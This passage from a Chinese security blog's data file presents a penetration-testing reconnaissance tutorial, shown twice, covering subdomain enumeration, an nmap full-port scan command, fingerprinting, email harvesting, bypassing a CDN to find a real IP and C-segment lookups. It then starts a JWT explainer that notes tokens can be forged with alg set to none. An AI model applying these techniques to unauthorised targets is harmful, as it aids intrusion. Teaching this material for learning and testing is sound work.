class=\"fas fa-external-link-alt\"></i></a>的保护；</p>\n<p>3.对主域名进行解析设置，在设置为泛解析的情况下，所有子域名都会指向主域名同样的IP。</p>\n<p>4.子域名与子域名之间一般权限都是相互分开的，不会彼此相互影响。</p>\n</blockquote>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><p><strong>原理</strong>：尝试与目标主机建立连接，如果目标主机有回复则说明端口开放。 </p>\n<p><strong>常用工具</strong>：nmap，goby，等</p>\n<p>我一般用nmap比较多，这里贴一个常用的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 -iL ip.txt -oX output.xml </span><br></pre></td></tr></table></figure>\n\n<p><strong>在线查询网站</strong></p>\n<ul>\n<li>在线端口扫描器：<a class=\"link\"   href=\"http://duankou.wlphp.com/\" >http://duankou.wlphp.com/<i class=\"fas fa-external-link-alt\"></i></a></li>\n<li>站长在线工具：<a class=\"link\"   href=\"http://www.all-tool.cn/Tools/portblast/\" >http://www.all-tool.cn/Tools/portblast/<i class=\"fas fa-external-link-alt\"></i></a></li>\n<li>MaTools：<a class=\"link\"   href=\"https://www.matools.com/port\" >https://www.matools.com/port<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<h4 id=\"指纹识别\"><a href=\"#指纹识别\" class=\"headerlink\" title=\"指纹识别\"></a>指纹识别</h4><pre><code>1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；\n\n2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；\n\n3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；\n\n4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；\n\n5、开发语言：比如PHP、Java、Ruby、Python、C#等；\n\n6、操作系统信息：比如linux、win2k8、win7、kali、centos等；\n\n7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；\n\n8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等；\n\n9、IP及域名信息：IP和域名注册信息、服务商信息等；\n\n10、端口信息：有些软件或平台还会探测服务器开放的常见端口。\n</code></pre>\n<p>这里推荐一些在线网站和工具</p>\n<blockquote>\n<blockquote>\n<p><strong>云悉</strong></p>\n<p><a class=\"link\"   href=\"https://www.yunsee.cn/\" >https://www.yunsee.cn/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>在线识别</strong></p>\n<p><a class=\"link\"   href=\"http://whatweb.bugscaner.com/look/\" >http://whatweb.bugscaner.com/look/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>fofa,goby测绘</strong></p>\n<p><a class=\"link\"   href=\"https://fofa.so/\" >https://fofa.so/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>wappalyzer插件</strong></p>\n<p>火狐，谷歌插件</p>\n<p><strong>潮汐指纹识别</strong></p>\n<p><a class=\"link\"   href=\"http://finger.tidesec.net/\" >http://finger.tidesec.net/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>数字观星</strong></p>\n<p><a class=\"link\"   href=\"https://fp.shuziguanxing.com/#/\" >https://fp.shuziguanxing.com/#/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>一些工具</strong></p>\n<p><a class=\"link\"   href=\"https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg\" >https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n</blockquote>\n<p>（潮汐指纹识别超好用压！）</p>\n<h4 id=\"空间搜索引擎\"><a href=\"#空间搜索引擎\" class=\"headerlink\" title=\"空间搜索引擎\"></a>空间搜索引擎</h4><p>有时运用空间搜索引擎，可以在最初拿到确定目标时，就找到弱点。</p>\n<p>目前比较常见的空间搜索引擎有 <strong>Fofa</strong>、<strong>Shodan</strong>、<strong>360 夸克</strong>、<strong>奇安信全球鹰</strong>、<strong>知道创宇 ZoomEye</strong> 等等。</p>\n<h4 id=\"目录获取\"><a href=\"#目录获取\" class=\"headerlink\" title=\"目录获取\"></a>目录获取</h4><p><strong>工具</strong>：dirsearch，ffuf，御剑</p>\n<p>ffuf 更侧重于 FFUZ，不过不管是目录扫描还是 FFUZ ，扫描的结果都在于字典，Github 上 4k 多个 star 的字典：<a class=\"link\"   href=\"https://github.com/TheKingOfDuck/fuzzDicts\" >https://github.com/TheKingOfDuck/fuzzDicts<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h4 id=\"邮箱地址获取\"><a href=\"#邮箱地址获取\" class=\"headerlink\" title=\"邮箱地址获取\"></a>邮箱地址获取</h4><p>邮箱地址比较常用的方法有直接通过搜索引擎找网上公开的邮箱信息，这种往往会指向目标的网站中，比如目标某个网页的附件中包含有邮箱等信息。</p>\n<p>之外还可以使用 Github 搜索目标公司开发者在代码中注释的邮箱信息，其实不太明白为什么开发者都喜欢把自己的邮箱注释到代码里。</p>\n<p>也可以通过领英找到目标公司的员工姓名，通过「拼音+@公司域名」的方法去构造员工邮箱。</p>\n<p>也有一些网站可以查询邮箱，这种比较方便，比如以下网站：</p>\n<p><a class=\"link\"   href=\"https://www.skymem.info/\" >https://www.skymem.info/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://app.snov.io/domain-search\" >https://app.snov.io/domain-search<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.email-format.com/i/search/\" >https://www.email-format.com/i/search/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>另外如果收集到了目标的 outlook 站点，也可以尝试去爆破邮箱用户名</p>\n<p>(这方面不太懂，没怎么试过)</p>\n<h4 id=\"真实ip\"><a href=\"#真实ip\" class=\"headerlink\" title=\"真实ip\"></a>真实ip</h4><p>由于cdn的存在，我们有时不能直接得到目标的真实ip</p>\n<p><strong>cdn原理：</strong></p>\n<p>就是将源站的资源缓存CDN各个节点上，当请求命中了某个节点的资源缓存时，立即返回客户端，避免每个请求的资源都通过源站获取，避免网络拥塞、缓解源站压力，保证用户访问资源的速度和体验。</p>\n<p>由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN。<br>这里推荐一个网站可以多个地点ping服务器，</p>\n<p><a class=\"link\"   href=\"https://asm.ca.com/en/ping.php\" >https://asm.ca.com/en/ping.php<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://ping.chinaz.com/\" >https://ping.chinaz.com/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"http://www.webkaka.com/ping.aspx\" >http://www.webkaka.com/ping.aspx<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437964.png\"\n                        alt=\"图片-1687322375738\"\n                 ></p>\n<ul>\n<li>二级域名发法</li>\n</ul>\n<p>目标站点一般不会把二级域名放在cdn上通过在线工具如站长帮手，收集子域名，确定了没使用CDN的二级域名后。本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。</p>\n<ul>\n<li>nslookup法</li>\n</ul>\n<p><a class=\"link\"   href=\"http://tool.chinaz.com/nslookup\" >http://tool.chinaz.com/nslookup<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。</p>\n<ul>\n<li>ping法</li>\n</ul>\n<p>直接ping example.com而不是<a class=\"link\"   href=\"http://www.example.com,因为现有很多cdn厂商基本只要求把www.example.com/\" >www.example.com，因为现有很多CDN厂商基本只要求把www.example.com<i class=\"fas fa-external-link-alt\"></i></a> cname到CDN主服务器上去，那么直接ping example.com有可能直接获得真实IP。</p>\n<h4 id=\"c段查询\"><a href=\"#c段查询\" class=\"headerlink\" title=\"c段查询\"></a>c段查询</h4><p>许多企业在办理宽带时，运营商为企业分配的IP往往都是连续的，所以我们可以通过被测目标的其他公网服务器进行横向到被测目标</p>\n<p><strong>常用在线C段查询网站</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">鹰图：https://hunter.qianxin.com/</span><br><span class=\"line\"> </span><br><span class=\"line\"> FOFA：https://fofa.info/toLogin</span><br><span class=\"line\"> </span><br><span class=\"line\"> 360空间测绘：https://quake.360.net/#/index</span><br><span class=\"line\"> </span><br><span class=\"line\"> 云溪：https://www.yunsee.cn/</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h4><p>可以查询联系人，联系邮箱，创建时间，过期时间等，有利于后面进一步的信息手机</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437038.png\"\n                        alt=\"图片-1687322388065\"\n                 ></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"外网信息搜集\"><a href=\"#外网信息搜集\" class=\"headerlink\" title=\"外网信息搜集\"></a>外网信息搜集</h1><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><h4 id=\"渗透测试流程\"><a href=\"#渗透测试流程\" class=\"headerlink\" title=\"渗透测试流程\"></a>渗透测试流程</h4><p>一般来说渗透测试流程 </p>\n<p><strong>外网信息收集&#x3D;&gt;入口权限突破&#x3D;&gt;内网信息收集&#x3D;&gt;权限提升&#x3D;&gt;横线渗透&#x3D;&gt;权限维持&#x3D;&gt;痕迹清理</strong></p>\n<p>信息搜集在第一位，也是任务最杂最繁重的。这一部分很关键，我们必须做好</p>\n<h1 id=\"外网信息搜集-1\"><a href=\"#外网信息搜集-1\" class=\"headerlink\" title=\"外网信息搜集\"></a>外网信息搜集</h1><h3 id=\"前言-1\"><a href=\"#前言-1\" class=\"headerlink\" title=\"前言\"></a>前言</h3><h4 id=\"渗透测试流程-1\"><a href=\"#渗透测试流程-1\" class=\"headerlink\" title=\"渗透测试流程\"></a>渗透测试流程</h4><p>一般来说渗透测试流程 </p>\n<p><strong>外网信息收集&#x3D;&gt;入口权限突破&#x3D;&gt;内网信息收集&#x3D;&gt;权限提升&#x3D;&gt;横线渗透&#x3D;&gt;权限维持&#x3D;&gt;痕迹清理</strong></p>\n<p>信息搜集在第一位，也是任务最杂最繁重的。这一部分很关键，我们必须做好</p>\n<h3 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><h4 id=\"主域名查询\"><a href=\"#主域名查询\" class=\"headerlink\" title=\"主域名查询\"></a>主域名查询</h4><p>主域名查询可分为备案域名查询和未备案域名查询</p>\n<ul>\n<li><strong>备案域名查询</strong></li>\n</ul>\n<p><a class=\"link\"   href=\"https://beian.miit.gov.cn/#/Integrated/index\" >https://beian.miit.gov.cn<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436515.png\"\n                        alt=\"图片-1687322327126\"\n                 ></p>\n<ul>\n<li><p><strong>未备案域名查询</strong></p>\n<p><strong>通过目标已知的网站获取</strong></p>\n<p>有些企业会把自己的其他业务站点放在网站尾部，里面也许会包含未备案的站点。</p>\n<p><strong>通过fofa等网络空间测绘工具</strong></p>\n<p>根据相关的语法，可以得到自己想要的信息</p>\n</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436630.png\"\n                        alt=\"图片-1687322359802\"\n                 ></p>\n<h4 id=\"子域名获取\"><a href=\"#子域名获取\" class=\"headerlink\" title=\"子域名获取\"></a>子域名获取</h4><p>这里一般用工具进行，我用过的工具有<strong>layer</strong>，但这个属于爆破了不推荐</p>\n<p>目前网上主流的有OneForAll等，这里贴个网址<a class=\"link\"   href=\"https://github.com/shmilylty/OneForAll\" >https://github.com/shmilylty/OneForAll<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>这里简单说明一些主域名与子域名的关系</p>\n<blockquote>\n<p>子域名是主域名的下一级或下下级域名，主域名的改动会对下面的子域名造成影响：</p>\n<p>1.主域名解析状态异常时，也会影响子域名的正常使用；</p>\n<p>2.对主域名使用通配符证书，其下的子域名也可受到<a class=\"link\"   href=\"https://www.sfn.cn/certificate.html\" >SSL证书<i class=\"fas fa-external-link-alt\"></i></a>的保护；</p>\n<p>3.对主域名进行解析设置，在设置为泛解析的情况下，所有子域名都会指向主域名同样的IP。</p>\n<p>4.子域名与子域名之间一般权限都是相互分开的，不会彼此相互影响。</p>\n</blockquote>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><p><strong>原理</strong>：尝试与目标主机建立连接，如果目标主机有回复则说明端口开放。 </p>\n<p><strong>常用工具</strong>：nmap，goby，等</p>\n<p>我一般用nmap比较多，这里贴一个常用的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 -iL ip.txt -oX output.xml </span><br></pre></td></tr></table></figure>\n\n<p><strong>在线查询网站</strong></p>\n<ul>\n<li>在线端口扫描器：<a class=\"link\"   href=\"http://duankou.wlphp.com/\" >http://duankou.wlphp.com/<i class=\"fas fa-external-link-alt\"></i></a></li>\n<li>站长在线工具：<a class=\"link\"   href=\"http://www.all-tool.cn/Tools/portblast/\" >http://www.all-tool.cn/Tools/portblast/<i class=\"fas fa-external-link-alt\"></i></a></li>\n<li>MaTools：<a class=\"link\"   href=\"https://www.matools.com/port\" >https://www.matools.com/port<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<h4 id=\"指纹识别\"><a href=\"#指纹识别\" class=\"headerlink\" title=\"指纹识别\"></a>指纹识别</h4><pre><code>1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；\n\n2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；\n\n3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；\n\n4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；\n\n5、开发语言：比如PHP、Java、Ruby、Python、C#等；\n\n6、操作系统信息：比如linux、win2k8、win7、kali、centos等；\n\n7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；\n\n8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等；\n\n9、IP及域名信息：IP和域名注册信息、服务商信息等；\n\n10、端口信息：有些软件或平台还会探测服务器开放的常见端口。\n</code></pre>\n<p>这里推荐一些在线网站和工具</p>\n<blockquote>\n<blockquote>\n<p><strong>云悉</strong></p>\n<p><a class=\"link\"   href=\"https://www.yunsee.cn/\" >https://www.yunsee.cn/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>在线识别</strong></p>\n<p><a class=\"link\"   href=\"http://whatweb.bugscaner.com/look/\" >http://whatweb.bugscaner.com/look/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>fofa,goby测绘</strong></p>\n<p><a class=\"link\"   href=\"https://fofa.so/\" >https://fofa.so/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>wappalyzer插件</strong></p>\n<p>火狐，谷歌插件</p>\n<p><strong>潮汐指纹识别</strong></p>\n<p><a class=\"link\"   href=\"http://finger.tidesec.net/\" >http://finger.tidesec.net/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>数字观星</strong></p>\n<p><a class=\"link\"   href=\"https://fp.shuziguanxing.com/#/\" >https://fp.shuziguanxing.com/#/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>一些工具</strong></p>\n<p><a class=\"link\"   href=\"https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg\" >https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n</blockquote>\n<p>（潮汐指纹识别超好用压！）</p>\n<h4 id=\"空间搜索引擎\"><a href=\"#空间搜索引擎\" class=\"headerlink\" title=\"空间搜索引擎\"></a>空间搜索引擎</h4><p>有时运用空间搜索引擎，可以在最初拿到确定目标时，就找到弱点。</p>\n<p>目前比较常见的空间搜索引擎有 <strong>Fofa</strong>、<strong>Shodan</strong>、<strong>360 夸克</strong>、<strong>奇安信全球鹰</strong>、<strong>知道创宇 ZoomEye</strong> 等等。</p>\n<h4 id=\"目录获取\"><a href=\"#目录获取\" class=\"headerlink\" title=\"目录获取\"></a>目录获取</h4><p><strong>工具</strong>：dirsearch，ffuf，御剑</p>\n<p>ffuf 更侧重于 FFUZ，不过不管是目录扫描还是 FFUZ ，扫描的结果都在于字典，Github 上 4k 多个 star 的字典：<a class=\"link\"   href=\"https://github.com/TheKingOfDuck/fuzzDicts\" >https://github.com/TheKingOfDuck/fuzzDicts<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h4 id=\"邮箱地址获取\"><a href=\"#邮箱地址获取\" class=\"headerlink\" title=\"邮箱地址获取\"></a>邮箱地址获取</h4><p>邮箱地址比较常用的方法有直接通过搜索引擎找网上公开的邮箱信息，这种往往会指向目标的网站中，比如目标某个网页的附件中包含有邮箱等信息。</p>\n<p>之外还可以使用 Github 搜索目标公司开发者在代码中注释的邮箱信息，其实不太明白为什么开发者都喜欢把自己的邮箱注释到代码里。</p>\n<p>也可以通过领英找到目标公司的员工姓名，通过「拼音+@公司域名」的方法去构造员工邮箱。</p>\n<p>也有一些网站可以查询邮箱，这种比较方便，比如以下网站：</p>\n<p><a class=\"link\"   href=\"https://www.skymem.info/\" >https://www.skymem.info/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://app.snov.io/domain-search\" >https://app.snov.io/domain-search<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.email-format.com/i/search/\" >https://www.email-format.com/i/search/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>另外如果收集到了目标的 outlook 站点，也可以尝试去爆破邮箱用户名</p>\n<p>(这方面不太懂，没怎么试过)</p>\n<h4 id=\"真实ip\"><a href=\"#真实ip\" class=\"headerlink\" title=\"真实ip\"></a>真实ip</h4><p>由于cdn的存在，我们有时不能直接得到目标的真实ip</p>\n<p><strong>cdn原理：</strong></p>\n<p>就是将源站的资源缓存CDN各个节点上，当请求命中了某个节点的资源缓存时，立即返回客户端，避免每个请求的资源都通过源站获取，避免网络拥塞、缓解源站压力，保证用户访问资源的速度和体验。</p>\n<p>由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN。<br>这里推荐一个网站可以多个地点ping服务器，</p>\n<p><a class=\"link\"   href=\"https://asm.ca.com/en/ping.php\" >https://asm.ca.com/en/ping.php<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://ping.chinaz.com/\" >https://ping.chinaz.com/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"http://www.webkaka.com/ping.aspx\" >http://www.webkaka.com/ping.aspx<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437964.png\"\n                        alt=\"图片-1687322375738\"\n                 ></p>\n<ul>\n<li>二级域名发法</li>\n</ul>\n<p>目标站点一般不会把二级域名放在cdn上通过在线工具如站长帮手，收集子域名，确定了没使用CDN的二级域名后。本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。</p>\n<ul>\n<li>nslookup法</li>\n</ul>\n<p><a class=\"link\"   href=\"http://tool.chinaz.com/nslookup\" >http://tool.chinaz.com/nslookup<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。</p>\n<ul>\n<li>ping法</li>\n</ul>\n<p>直接ping example.com而不是<a class=\"link\"   href=\"http://www.example.com,因为现有很多cdn厂商基本只要求把www.example.com/\" >www.example.com，因为现有很多CDN厂商基本只要求把www.example.com<i class=\"fas fa-external-link-alt\"></i></a> cname到CDN主服务器上去，那么直接ping example.com有可能直接获得真实IP。</p>\n<h4 id=\"c段查询\"><a href=\"#c段查询\" class=\"headerlink\" title=\"c段查询\"></a>c段查询</h4><p>许多企业在办理宽带时，运营商为企业分配的IP往往都是连续的，所以我们可以通过被测目标的其他公网服务器进行横向到被测目标</p>\n<p><strong>常用在线C段查询网站</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">鹰图：https://hunter.qianxin.com/</span><br><span class=\"line\"> </span><br><span class=\"line\"> FOFA：https://fofa.info/toLogin</span><br><span class=\"line\"> </span><br><span class=\"line\"> 360空间测绘：https://quake.360.net/#/index</span><br><span class=\"line\"> </span><br><span class=\"line\"> 云溪：https://www.yunsee.cn/</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h4><p>可以查询联系人，联系邮箱，创建时间，过期时间等，有利于后面进一步的信息手机</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437038.png\"\n                        alt=\"图片-1687322388065\"\n                 ></p>\n"},{"title":"浅析JWT","date":"2022-01-13T14:27:22.000Z","excerpt":"浅析JWT","_content":"\n\n\n# 浅析JWT\n\n### JWT简介\n\n> Json web token (JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。\n\n我们在学习jwt的同时，也需要了解传统session认证\n\n### session认证\n\n> 我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie，以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了，这就是传统的基于session认证。\n\n\n\n这种传统的**session**我们很难得到拓展，并且session相关的数据是保存在服务器中，随着用户数量的增加，服务器的载荷也就越大，这时候许多问题就暴露了出来\n\n- **Session**：每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而**随着认证用户的增多，服务端的开销会明显增大。**\n- **扩展性**：用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上，这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。\n- **CSRF**: 因为是 基于cookie 来进行用户识别的，**cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。**\n\n\n\n### JWT与Session的差异\n\n**相同点**：**它们都是存储用户信息；**\n\n**不同点**\n\n- **Session是在服务器端的，而JWT是在客户端的。**\n\n- **Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。**\n- **Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端**\n\n![图片-1684742759615](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151430767.png)\n\n\n\n### 基于Token的身份认证 与 基于服务器的身份认证\n\n#### 基于服务器的身份认证\n\n在讨论基于Token的身份认证是如何工作的以及它的好处之前，我们先来看一下以前我们是怎么做的：\n\n> HTTP协议是无状态的，也就是说，如果我们已经认证了一个用户，那么他下一次请求的时候，服务器不知道我是谁，我们必须再次认证\n\n传统的做法是将已经认证过的用户信息存储在服务器上，比如Session。用户下次请求的时候带着Session ID，然后服务器以此检查用户是否认证过。\n\n这种基于服务器的身份认证方式存在一些问题：\n\n- **Sessions : 每次用户认证通过以后，服务器需要创建一条记录保存用户信息，通常是在内存中，随着认证通过的用户越来越多，服务器的在这里的开销就会越来越大。**\n- **Scalability : 由于Session是在内存中的，这就带来一些扩展性的问题。**\n- **CORS : 当我们想要扩展我们的应用，让我们的数据被多个移动设备使用时，我们必须考虑跨资源共享问题。当使用AJAX调用从另一个域名下获取资源时，我们可能会遇到禁止请求的问题。**\n- **CSRF : 用户很容易受到CSRF攻击。**\n\n#### 用Token的好处\n\n- **无状态和可扩展性：Tokens存储在客户端。完全无状态，可扩展。我们的负载均衡器可以将用户传递到任意服务器，因为在任何地方都没有状态或会话信息。**\n- **安全：Token不是Cookie。（The token, not a  cookie.）每次请求的时候Token都会被发送。而且，由于没有Cookie被发送，还有助于防止CSRF攻击。即使在你的实现中将token存储到客户端的Cookie中，这个Cookie也只是一种存储机制，而非身份认证机制。没有基于会话的信息可以操作，因为我们没有会话!**\n- **token在一段时间以后会过期，这个时候用户需要重新登录。这有助于我们保持安全。还有一个概念叫token撤销，它允许我们根据相同的授权许可使特定的token甚至一组token无效。**\n\n### 什么时候用JWT\n\n下列场景中使用JSON Web Token是很有用的：\n\n- **Authorization** (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。\n- **Information Exchange** (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web  Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。\n\n\n\n### JWT结构\n\nJSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：\n\n- **Header**\n- **Payload**\n- **Signature**\n\n下面具体来看看每个部分\n\n#### Header（头部）\n\njwt头部承载两部分信息\n\n- **声明类型**：类似于jwt\n- **声明加密的算法**：通常直接使用 HMAC SHA256。这的加密算法也就是签名算法。\n\n```\n{\n  'typ': 'JWT',\n  'alg': 'HS256'\n}\n```\n\n然后将头部进行**base64加密**得到第一部分\n\n```\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\n```\n\n\n\n> **可以将JWT中的alg算法修改为none：**\n>\n> **JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问。**\n\n\n\n#### 